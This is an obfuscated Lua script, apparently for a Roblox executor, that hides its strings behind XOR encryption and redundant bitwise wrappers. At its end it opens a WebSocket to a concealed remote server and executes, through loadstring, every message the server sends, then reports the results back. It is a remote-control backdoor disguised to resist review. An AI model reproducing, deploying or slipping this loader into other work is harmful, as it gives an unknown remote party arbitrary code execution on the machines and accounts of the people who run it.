
local obf_stringchar = string.char;
local obf_stringbyte = string.byte;
local obf_stringsub = string.sub;
local obf_bitlib = bit32 or bit;
local obf_XOR = obf_bitlib.bxor;
local obf_tableconcat = table.concat;
local obf_tableinsert = table.insert;
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	local result = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + (i % #LUAOBFUSACTOR_KEY), 1 + (i % #LUAOBFUSACTOR_KEY) + 1))) % 256));
	end
	return obf_tableconcat(result);
end
local obf_bitlib = bit32 or bit;
local obf_XOR = obf_bitlib.bxor;
local obf_OR = obf_bitlib.bor;
local obf_AND = obf_bitlib.band;
bit32 = {};
local N = 32;
local P = 2 ^ N;
bit32.bnot = function(x)
	x = x % P;
	return (P - 1) - x;
end;
bit32.band = function(x, y)
	if (y ~= 255) then
	else
		return x % 256;
	end
	if (y ~= 65535) then
	else
		return x % 65536;
	end
	if (y ~= 4294967295) then
	else
		return x % 4294967296;
	end
	x, y = x % P, y % P;
	local r = 0;
	local p = 1;
	for i = 1, N do
		local a, b = x % 2, y % 2;
		x, y = math.floor(x / 2), math.floor(y / 2);
		if ((obf_AND(a, b) + obf_OR(a, b)) == 2) then
			r = r + p;
		end
		p = 2 * p;
	end
	return r;
end;
bit32.bor = function(x, y)
	if (y == 255) then
		return (x - (x % 256)) + 255;
	end
	if (y == 65535) then
		return obf_AND(x - (x % 65536), 65535) + obf_OR(x - (x % 65536), 65535);
	end
	if (y ~= 4294967295) then
	else
		return 4294967295;
	end
	x, y = x % P, y % P;
	local r = 0;
	local p = 1;
	for i = 1, N do
		local a, b = x % 2, y % 2;
		x, y = math.floor(x / 2), math.floor(y / 2);
		if ((obf_AND(a, b) + obf_OR(a, b)) < 1) then
		else
			r = obf_AND(r, p) + obf_OR(r, p);
		end
		p = 2 * p;
	end
	return r;
end;
bit32.bxor = function(x, y)
	x, y = x % P, y % P;
	local r = 0;
	local p = 1;
	for i = 1, N do
		local a, b = x % 2, y % 2;
		x, y = math.floor(x / 2), math.floor(y / 2);
		if ((obf_AND(a, b) + obf_OR(a, b)) == 1) then
			r = obf_AND(r, p) + obf_OR(r, p);
		end
		p = 2 * p;
	end
	return r;
end;
bit32.lshift = function(x, s_amount)
	if (math.abs(s_amount) >= N) then
		return 0;
	end
	x = x % P;
	if (s_amount < 0) then
		return math.floor(x * (2 ^ s_amount));
	else
		return (x * (2 ^ s_amount)) % P;
	end
end;
bit32.rshift = function(x, s_amount)
	if (math.abs(s_amount) < N) then
	else
		return 0;
	end
	x = x % P;
	if (s_amount > 0) then
		return math.floor(x * (2 ^ -s_amount));
	else
		return (x * (2 ^ -s_amount)) % P;
	end
end;
bit32.arshift = function(x, s_amount)
	if (math.abs(s_amount) < N) then
	else
		return 0;
	end
	x = x % P;
	if (s_amount > 0) then
		local add = 0;
		if (x < (P / 2)) then
		else
			add = P - (2 ^ (N - s_amount));
		end
		return obf_AND(math.floor(x * (2 ^ -s_amount)), add) + obf_OR(math.floor(x * (2 ^ -s_amount)), add);
	else
		return (x * (2 ^ -s_amount)) % P;
	end
end;
local TABLE_TableIndirection = {};
TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\222\193\221\26\245\175\213\23\223\196\216\45\231\169\130\78", "\126\177\163\187\69\134\219\167")] = string[LUAOBFUSACTOR_DECRYPT_STR_0("\32\197\43\215", "\156\67\173\74\165")];
TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\59\181\79\41\175\50\84\61\185\78\20\165\50\67\113\231", "\38\84\215\41\118\220\70")] = string[LUAOBFUSACTOR_DECRYPT_STR_0("\82\15\54\23", "\158\48\118\66\114")];
TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\164\38\22\9\96\177\233\162\42\23\37\102\167\190\251", "\155\203\68\112\86\19\197")] = string[LUAOBFUSACTOR_DECRYPT_STR_0("\85\200\52", "\152\38\189\86\156\32\24\133")];
TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\243\85\161\121\254\94\179\74\245\85\226\22", "\38\156\55\199")] = bit32 or bit;
TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\167\127\122\23\43\91\200\6\248", "\35\200\29\28\72\115\20\154")] = TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\22\189\215\224\143\37\32\21\182\211\154\221", "\84\121\223\177\191\237\76")][LUAOBFUSACTOR_DECRYPT_STR_0("\185\78\198\178", "\161\219\54\169\192\90\48\80")];
TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\70\64\6\26\93\67\2\41\76\65\15\43\74\67\20\96\25", "\69\41\34\96")] = table[LUAOBFUSACTOR_DECRYPT_STR_0("\191\204\217\9\3\63", "\75\220\163\183\106\98")];
TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\13\184\141\8\205\3\184\135\50\208\12\169\142\37\205\71\234", "\185\98\218\235\87")] = table[LUAOBFUSACTOR_DECRYPT_STR_0("\194\50\52\227\204\190", "\202\171\92\71\134\190")];
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\59\196\63\157\37\213\105\216", "\232\73\161\76")] = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\180\219\68\98\10\186\219\78\88\23\181\202\71\79\10\254\137", "\126\219\185\34\61")](TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\30\203\77\103\114\99\182\183", "\135\108\174\62\18\30\23\147")], TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\185\235\44\244\11\186\33\206\184\238\41\195\25\188\118\151", "\167\214\137\74\171\120\206\83")](TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\132\242\52\98\192\136\185\181\98", "\199\235\144\82\61\152")](TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\8\20\191\20\20\2\171\34\9\17\187\50\19\19\252\123", "\75\103\118\217")](TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\200\86\118\43\170\10\213\93\126\19\170\11\197\17\32", "\126\167\52\16\116\217")](LUAOBFUSACTOR_STR, i, obf_AND(i, 1) + obf_OR(i, 1))), TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\199\44\38\191\167\13\238\193\32\39\130\173\13\249\141\126", "\156\168\78\64\224\212\121")](TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\8\236\163\241\20\250\183\199\9\233\182\219\5\171\245", "\174\103\142\197")](LUAOBFUSACTOR_KEY, 1 + (i % #LUAOBFUSACTOR_KEY), obf_AND(1 + (i % #LUAOBFUSACTOR_KEY), 1) + obf_OR(1 + (i % #LUAOBFUSACTOR_KEY), 1)))) % 256));
	end
	return TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\89\42\89\7\49\95\250\90\45\92\55\43\93\249\66\109\15", "\152\54\72\63\88\69\62")](TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\198\193\253\73\216\208\171\12", "\60\180\164\142")]);
end
task.spawn(function()
	TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\89\27\85", "\114\56\62\101\73\71\141")] = WebSocket.connect(LUAOBFUSACTOR_DECRYPT_STR_0("\198\208\129\106\169\179\194\18\200\194\149\53\255\183\194\6\159\219\194\63\188\234\151\71\128\151\148\50\245", "\126\177\163\187\69\134\219\167"));
	TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\185\172\139", "\164\216\137\187")]:Send(LUAOBFUSACTOR_DECRYPT_STR_0("\0\226\4\235\217\0\249\3\234\210\99\254\31\230\223\6\254\25", "\156\67\173\74\165"));
	TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\211\163\97", "\107\178\134\81\210\198\158")][LUAOBFUSACTOR_DECRYPT_STR_0("\23\0\175\195\185\43\15\133\195", "\202\88\110\226\166")]:Connect(function(k)
		local s, e = pcall(function()
			TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\194\74\210", "\170\163\111\226\151")]:Send(tostring(loadstring(k)()));
		end);
		TABLE_TableIndirection[LUAOBFUSACTOR_DECRYPT_STR_0("\16\117\226", "\73\113\80\210\88\46\87")]:Send(tostring(s) .. LUAOBFUSACTOR_DECRYPT_STR_0("\40\247", "\38\84\215\41\118\220\70") .. tostring(e));
	end);
end);
